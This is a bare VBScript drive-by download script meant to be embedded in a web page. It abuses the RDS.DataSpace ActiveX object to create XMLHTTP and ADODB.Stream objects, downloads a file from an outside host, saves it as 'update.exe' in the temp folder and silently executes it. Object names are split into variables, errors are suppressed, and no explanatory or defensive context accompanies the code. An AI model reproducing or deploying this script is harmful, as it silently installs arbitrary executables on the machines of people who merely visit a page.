<script language="VBScript">
    on error resume next
    dl = "http://shojacash.ws/load/get.php?file=ie"
    Set df = document.createElement("object")

    clsfull="clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"


    df.setAttribute "classid",clsfull

    strr="Microsoft.XMLHTTP" 

    Set x = df.CreateObject(strr,"")

    strb5="Adodb.Stream"
    set YY = df.createobject(strb5,"")
    YY.type = 1
    str6="GET"
    x.Open str6, dl, False
    x.Send
    fnamezz1="update.exe"

    scripp="Scripting.FileSystemObject"

    set FF = df.createobject(scripp,"")
    set tmp = F.GetSpecialFolder(2)
    fnamezz1= FF.BuildPath(tmp,fnamezz1)

    YY.open
    YY.write x.responseBody
    YY.savetofile fnamezz1,2
    YY.close
    set MM = df.createobject("Shell.Application","")
	MM.ShellExecute fnamezz1,"","","open",0
</script>
